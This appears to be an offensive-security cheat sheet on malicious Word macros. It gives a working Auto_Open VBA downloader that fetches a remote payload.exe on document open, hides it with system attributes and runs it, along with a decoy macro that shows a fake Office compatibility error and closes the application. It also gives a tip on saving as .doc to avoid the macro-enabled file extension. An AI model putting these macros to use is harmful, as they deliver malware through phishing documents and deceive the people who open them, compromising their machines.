# Macros

## Tips

* Save Word document as "Word 97-2004 Document .doc" to not have to use the "Word Macro-Enabled Document \(.docm\)
* 
## Simple Download / Exec

```text
Sub Auto_Open()

Const ADTYPEBINARY = 1
Const ADSAVECREATEOVERWRITE = 2

Dim xHttp
Dim bStrm
Dim filename

Set xHttp = CreateObject("Microsoft.XMLHTTP")
xHttp.Open "GET", "https://.../payload.exe", False
xHttp.Send

Set gobjBinaryOutputStream = CreateObject("Adodb.Stream")

filename = Environ("USERPROFILE") & "\" & DateDiff("s", #1/1/1970#, Now())

gobjBinaryOutputStream.Type = ADTYPEBINARY
gobjBinaryOutputStream.Open
gobjBinaryOutputStream.write xHttp.responseBody
gobjBinaryOutputStream.savetofile filename, ADSAVECREATEOVERWRITE

SetAttr filename, vbReadOnly + vbHidden + vbSystem
Shell (filename)

End Sub
```

Inspired by [https://gist.github.com/nopslider/0d48760928642ca190ed](https://gist.github.com/nopslider/0d48760928642ca190ed)

## Print dummy error message and quit

```text
Dim title As String
title = "Microsoft Office (Compatibility Mode)"
Dim msg As String
Dim intResponse As Integer
msg = "This application appears to have been made with an older version of the Microsoft Office product suite. Please have the author save this document to a newer and supported format. [Error Code: -219]"
intResponse = MsgBox(msg, 16, title)
Application.Quit
```

Source: [Unicorn](unicorn.md)

